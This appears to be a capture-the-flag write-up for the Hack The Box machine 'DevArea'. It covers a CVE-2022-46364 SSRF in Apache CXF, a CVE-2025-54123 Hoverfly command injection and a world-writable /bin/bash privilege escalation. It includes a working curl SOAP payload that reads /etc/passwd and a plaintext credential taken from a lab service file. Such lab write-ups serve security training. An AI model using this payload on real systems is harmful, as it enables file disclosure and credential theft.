# DevArea

> https://app.hackthebox.com/machines/DevArea

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/db96accc-5a32-4d5d-8100-6e063d7a29e9" />

## Table of Contents

- [About](#about)
- [References](#references)
- [Reconnaissance](#reconnaissance)
- [Source-Code Analysis](#source-code-analysis)
- [CVE-2022-46364](#cve-2022-46364)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## About

DevArea was a Medium Linux machine running multiple web services, including a SOAP-based service built with Apache CXF and a Hoverfly API simulation tool. The challenge involves exploiting CVE-2022-46364, an SSRF vulnerability in Apache CXF's MTOM request parsing, to read arbitrary files and extract Hoverfly credentials from systemd service configurations. After gaining access via CVE-2025-54123, a command injection vulnerability in Hoverfly's middleware API, privilege escalation can be achieved by exploiting insecure file permissions on the `/bin/bash` binary, which could be replaced to execute arbitrary code as root.

## References

- [Jetty](https://jetty.org/)
- [Hoverfly.io](https://hoverfly.io/)
- [Apache CXF](https://cxf.apache.org/)
- [MTOM Requests](https://www.w3.org/TR/soap12-mtom/)
- [SOAP: Protocol](https://en.wikipedia.org/wiki/SOAP)
- [Hoverfly: Documentation](https://docs.hoverfly.io/en/latest/)
- [PoC: CVE-2022-46364](https://github.com/kasem545/CVE-2022-46364-Poc)
- [Advisory: CVE-2025-54123](https://github.com/advisories/GHSA-r4h8-hfp2-ggmf)
- [SentinelOne: CVE-2022-46364](https://www.sentinelone.com/vulnerability-database/cve-2022-46364/)
- [SentinelOne: CVE-2025-54123](https://www.sentinelone.com/vulnerability-database/cve-2025-54123/)

## Reconnaissance

Port scanning revealed the following open ports:

- __21/tcp__: vsftpd 3.0.5
- __22/tcp__: OpenSSH 9.6p1 Ubuntu
- __80/tcp__: Apache httpd 2.4.58
- __8080/tcp__: Jetty 9.4.27.v20200227
- __8500/tcp__: Golang net/http server (PROXY)
- __8888/tcp__: Golang net/http server (Hoverfly Dashboard)

<img width="1898" height="970" alt="0" src="https://github.com/user-attachments/assets/b1bf8d12-0d41-4139-8aa8-2b69259bebcb" />

The website at port 80 was mostly static. It acts as an employment platform for developers with job listings.

<img width="1920" height="970" alt="1" src="https://github.com/user-attachments/assets/4caeedb3-4bac-4292-a0e8-8b672b6b859c" />

At port 8080, there was [Jetty 9.4.27.v20200227](https://jetty.org/).

<img width="978" height="246" alt="2" src="https://github.com/user-attachments/assets/6a9eddd4-9f46-4a9f-87ae-cc5e55afa912" />

From [jetty.org](https://jetty.org/):

_"Eclipse Jetty provides a highly scalable and memory-efficient web server and servlet container, supporting many protocols such as HTTP/3,2,1 and WebSocket. Furthermore, the project offers integrations with many other technologies, such as OSGi, JMX, JNDI, JAAS, etc."_

At port 8888 was hosted the Hoverfly Dashboard login page.

<img width="1919" height="469" alt="3" src="https://github.com/user-attachments/assets/b64ec0f1-33e3-43cd-8d28-a30ef76c4e6a" />

From the [Hoverfly Documentation](https://docs.hoverfly.io/en/latest/):

_"What is Hoverfly?_

_Hoverfly is a lightweight, open source API simulation tool. Using Hoverfly, you can create realistic simulations of the APIs your application depends on."_

- Replace slow, flaky API dependencies with realistic, re-usable simulations
- Simulate network latency, random failures or rate limits to test edge-cases
- Extend and customize with any programming language
- Export, share, edit and import API simulations
- CLI and native language bindings for Java and Python
- REST API
- Lightweight, high-performance, run anywhere
- Apache 2 license

## Source Code Analysis

FTP allowed anonymous login. Inside there was a JAR file:

```
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
```

Extracting it reveals the compiled classes and configuration files of the application, which can be decompiled using _JADX_ to recover the source code.

<img width="1173" height="251" alt="4" src="https://github.com/user-attachments/assets/9a0741e7-b0a8-48f4-ba0d-d997d8a896b5" />

### htb/devarea/ServerStarter.java

This is the entry point of the application. It uses [Apache CXF](https://cxf.apache.org/) to expose `EmployeeServiceImpl` as a _SOAP_ web service on port 8080, with the WSDL accessible at `/employeeservice?wsdl`.

```java
package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

### htb/devarea/EmployeeService.java

The SOAP service interface, defining submitReport as the single exposed operation within the `http://devarea.htb/` namespace.

```java
package htb.devarea;

import javax.jws.WebService;

@WebService(name = "EmployeeService", targetNamespace = "http://devarea.htb/")
public interface EmployeeService {
    String submitReport(Report report);
}
```

### htb/devarea/EmployeeServiceImpl.java

The service implementation. It processes the submitted Report object and returns the employeeName directly in the response string.

```java
package htb.devarea;

public class EmployeeServiceImpl implements EmployeeService {
    @Override // htb.devarea.EmployeeService
    public String submitReport(Report report) {
        String str;
        if (report.isConfidential()) {
            str = "Report marked confidential. Thank you, " + report.getEmployeeName();
        } else {
            str = "Report received from " + report.getEmployeeName();
        }
        String greeting = str;
        return greeting + ". Department: " + report.getDepartment() + ". Content: " + report.getContent();
    }
}
```

### htb/devarea/Report.java

The data model representing a report submission, with four fields: `employeeName`, `department`, `content`, and `confidential`.

```java
package htb.devarea;

public class Report {
    private String employeeName;
    private String department;
    private String content;
    private boolean confidential;

    public String getEmployeeName() {
        return this.employeeName;
    }

    public void setEmployeeName(String employeeName) {
        this.employeeName = employeeName;
    }

    public String getDepartment() {
        return this.department;
    }

    public void setDepartment(String department) {
        this.department = department;
    }

    public String getContent() {
        return this.content;
    }

    public void setContent(String content) {
        this.content = content;
    }

    public boolean isConfidential() {
        return this.confidential;
    }

    public void setConfidential(boolean confidential) {
        this.confidential = confidential;
    }

    public String toString() {
        return "Report{employeeName='" + this.employeeName + "', department='" + this.department + "', content='" + this.content + "', confidential=" + this.confidential + '}';
    }
}
```

## CVE-2022-46364

It's noticeable that `ServerStarter.java` is importing __org.apache.cxf.jaxws.JaxWsServerFactoryBean__. We can refer to the `version.properties` file to see the library version used by the application.

<img width="1897" height="299" alt="5" src="https://github.com/user-attachments/assets/085780ab-4a62-4696-aba7-a95b913d43b2" />

The actual attack surface is the SOAP service itself running on port 8080. This service is built on [Apache CXF](https://cxf.apache.org/), and [CVE-2022-46364](https://www.sentinelone.com/vulnerability-database/cve-2022-46364/) affects versions before 3.5.5 / 3.4.10. The vulnerability is an _SSRF_ affecting [MTOM request](https://cxf.apache.org/docs/mtom.html) parsing that enables attackers to perform server-side request forgery attacks.

[MTOM](https://www.w3.org/TR/soap12-mtom/) is a W3C recommendation for optimizing the transmission of binary data in _SOAP_ messages, and _XOP:Include_ elements allow referencing binary content via URI references. _Apache CXF_ fails to properly validate these URI references, enabling attackers to specify arbitrary URLs that the server will then request.

### Exploitation: Manual

A crafted POST request can be sent with _cURL_ or through _BurpSuite_, and the response will be encoded in base64 in the _SOAP envelope_:

```bash
SSRF="file:///etc/passwd"

curl --path-as-is -i -s -k -X POST \
  -H 'Host: devarea.htb:8080' \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="----=_Part_1"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  -H 'SOAPAction: ""' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
  -H 'Connection: keep-alive' \
  --data-binary $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <dev:submitReport>\r\n         <arg0>\r\n            <confidential>false</confidential>\r\n            <content>test</content>\r\n            <department>IT</department>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$SSRF"'"/></employeeName>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--\r\n' \
  'http://devarea.htb:8080/employeeservice'

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2026 01:21:29 GMT
Content-Type: text/xml;charset=utf-8
Content-Length: 2919
Server: Jetty(9.4.27.v20200227)

[...]
```

<img width="1508" height="575" alt="6" src="https://github.com/user-attachments/assets/84ca32c7-564d-45e8-ad8b-a9f8980adfb3" />

### Exploitation: Automated

[This Proof of Concept](https://github.com/kasem545/CVE-2022-46364-Poc) can be used to achieve SSRF on `devarea.htb:8080`. Initially, reading _/etc/passwd_ revealed the user: `dev_ryan`.

<img width="1910" height="984" alt="7" src="https://github.com/user-attachments/assets/1e38a820-638c-4860-bf08-be25c04b5681" />

<br>

After some time fuzzing for files of interest, I eventually decided to list the _systemd_ services running on the machine (__/etc/systemd/system__). This revealed two interesting services: `employee-service.service` and `hoverfly.service`.

### employee-service.service

Interestingly, the author set the user flag (`/home/dev_ryan/user.txt`) as __Inaccessible__ to prevent people from reading the flag through the _SSRF_.

```toml
[Unit]
Description=Employee Service (Java CXF + Jetty)
After=network.target

[Service]
User=dev_ryan
WorkingDirectory=/home/dev_ryan
InaccessiblePaths=/home/dev_ryan/user.txt
ProtectHome=false
ExecStart=/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/EmployeeService/target/employee-service.jar
SuccessExitStatus=143
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal
Environment=JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64

[Install]
WantedBy=multi-user.target
```

### hoverfly.service

In the service configuration, the plaintext credentials for _Hoverfly_ running on port 8888 were visible: `admin:O7IJ27MyyXiU`.

```toml
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

## Initial Access

With the previously obtained credentials, I could access _Hoverfly_ on port 8888. The Dashboard showed information such as:

- __Mode__: `simulate`
- __Version__: `v1.11.3`

<img width="1919" height="962" alt="8" src="https://github.com/user-attachments/assets/46064590-d0ec-4453-a881-d5a81ae206fd" />

The version is particularly important in this case because it's vulnerable to [CVE-2025-54123](https://www.sentinelone.com/vulnerability-database/cve-2025-54123/).

This command injection vulnerability stems from a combination of three distinct code-level flaws in the Hoverfly codebase. The vulnerability allows attackers to pass malicious input through the middleware API endpoint, which is then directly passed to system command execution without proper sanitization.

The vulnerability results from three interconnected code flaws:

1. Insufficient Input Validation in middleware.go (lines 94-96): The middleware configuration accepts user input without adequate validation:

```go
func (this *Middleware) SetBinary(binary string) error {
    this.Binary = binary  // No validation of binary parameter here
    return nil
}
```

2. Unsafe Command Execution in local_middleware.go (lines 14-19): User-controlled input is passed directly to system command execution functions:

```go
var middlewareCommand *exec.Cmd
if this.Script == nil {
    middlewareCommand = exec.Command(this.Binary)  // User-controlled binary
} else {
    middlewareCommand = exec.Command(this.Binary, this.Script.Name())  // User-controlled binary and script
}
```

3. Immediate Execution During Testing in hoverfly_service.go (line 173): The middleware is executed immediately when set, allowing instant exploitation:

```go
_, err = newMiddleware.Execute(testData)  // Executes middleware immediately for testing
```

I used the [Proof of Concept](https://github.com/advisories/GHSA-r4h8-hfp2-ggmf) provided in the GitHub advisory to trigger a reverse shell and gain access as `dev_ryan`.

<img width="1862" height="666" alt="9" src="https://github.com/user-attachments/assets/16199027-2493-4178-a91d-bcf749fd26ec" />

## Privilege Escalation

Listing sudo privileges for `dev_ryan` showed that he could run `/opt/syswatch/syswatch.sh` as __root__.

I didn't have access to the `/opt/syswatch` directory at the time, but there was a backup of this program in `dev_ryan`'s home directory.

<img width="1394" height="427" alt="10" src="https://github.com/user-attachments/assets/0fccf170-324d-4be0-b054-a72f7e83d1ee" />

Extracting the `syswatch.zip` archive revealed a system monitoring application designed to track CPU, memory, disk usage, network connections, and service status. The application consists of multiple bash scripts that perform various monitoring tasks and a Flask-based web GUI for visualization.

The configuration file revealed several important settings:

```bash
# SysWatch configuration
export EMAIL_ADMIN="admin@devarea.htb"

export CPU_THRESHOLD=80
export MEM_THRESHOLD=80
export DISK_THRESHOLD=80
export NET_MAX_CONNECTIONS=500
export NET_MAX_PER_IP=50

export SERVICES=("apache2:1" "ssh:0" "syswatch-web:0" "vsftpd:0" "hoverfly:0" "syswatch-monitor:0")

export LOG_DIR="/opt/syswatch/logs"
export CPU_MEM_LOG="$LOG_DIR/cpu-mem.log"
export DISK_LOG="$LOG_DIR/disk.log"
export NETWORK_LOG="$LOG_DIR/network.log"
export LOG_MONITOR_LOG="$LOG_DIR/log-alerts.log"
export SERVICE_LOG="$LOG_DIR/service.log"

export PLUGIN_DIR="/opt/syswatch/plugins"
export SYSWATCH_USER="syswatch"
```

The directory listing showed `syswatch.sh`, the same file that could be run as `root`.

<img width="1319" height="587" alt="11" src="https://github.com/user-attachments/assets/3796b97c-3ee4-4042-a28a-b2ce49407126" />

In `setup.sh`, there was a constant defined as `ENV_FILE`. Reading it revealed the _Flask Secret_, an admin password, and some path constants:

```bash
"$OPT_DIR/venv/bin/pip" install --upgrade pip
"$OPT_DIR/venv/bin/pip" install -r "$OPT_DIR/syswatch_gui/requirements.txt"
ENV_FILE="/etc/syswatch.env"
SECRET="${SYSWATCH_SECRET_KEY:-}"
ADMIN="${SYSWATCH_ADMIN_PASSWORD:-}"
```

<img width="1076" height="187" alt="14" src="https://github.com/user-attachments/assets/acd10ea8-d2ac-4681-bdf8-eec7c2c568fb" />

The GUI is a Flask application exposed only on localhost. I tried port forwarding through SSH, but couldn't access the service even with the correct credentials.

<img width="1917" height="1008" alt="12" src="https://github.com/user-attachments/assets/d215ad18-377b-4145-9dfc-ed9116c27561" />

This is what the dashboard looks like when run locally and after forcefully adding a user:

<img width="1914" height="867" alt="13" src="https://github.com/user-attachments/assets/350c1ef2-968c-493f-bfd6-bd4b61e49f4a" />

Analyzing the bash scripts, I noticed that `/bin/bash` was referenced multiple times. Inspecting the bash binary revealed insecure file permissions: it was writable by _all_ users. This meant I could add malicious functionality to bash or replace it entirely.

<img width="709" height="84" alt="15" src="https://github.com/user-attachments/assets/5fceea21-8917-43cb-bf40-fbca35fd89c2" />

Initially, I tried embedding malicious code _directly_ into __/bin/bash__, but it failed. My assumption is that this could be due to __PIE__ / __ASLR__ / __Hardening__ protections.

Since I could put _any_ code into the `/bin/bash` file, there were multiple ways to achieve root. I opted for a simple reverse shell. First, I made a copy of the original `bash` binary and placed it in another location. Then, I spawned a new shell with `/bin/sh`, killed all running `bash` processes, and executed `sudo /opt/syswatch/syswatch.sh`, effectively granting me root access and completing the challenge.

<img width="1904" height="608" alt="16" src="https://github.com/user-attachments/assets/3f087430-888b-4ea2-a95e-0387a84678a8" />

## Conclusion

The DevArea machine demonstrated exploitation of multiple vulnerabilities across different technologies. The key lessons learned from this machine included:

- **SSRF in MTOM parsing enabled file disclosure**: CVE-2022-46364 in Apache CXF allowed reading arbitrary files through maliciously crafted XOP:Include elements in SOAP requests, exposing sensitive systemd configuration files

- **Command injection in API middleware provided RCE**: CVE-2025-54123 in Hoverfly v1.11.3 allowed executing arbitrary commands through unsanitized user input in the middleware API endpoint, which was immediately tested upon configuration

- **Insecure file permissions on critical binaries enabled privilege escalation**: World-writable permissions on `/bin/bash` allowed complete replacement of the shell binary, bypassing security hardening mechanisms when executed with sudo privileges

- **Systemd service configurations exposed credentials in plaintext**: The hoverfly.service file contained unencrypted credentials accessible through SSRF, demonstrating the importance of using secret management solutions instead of embedding credentials in configuration files
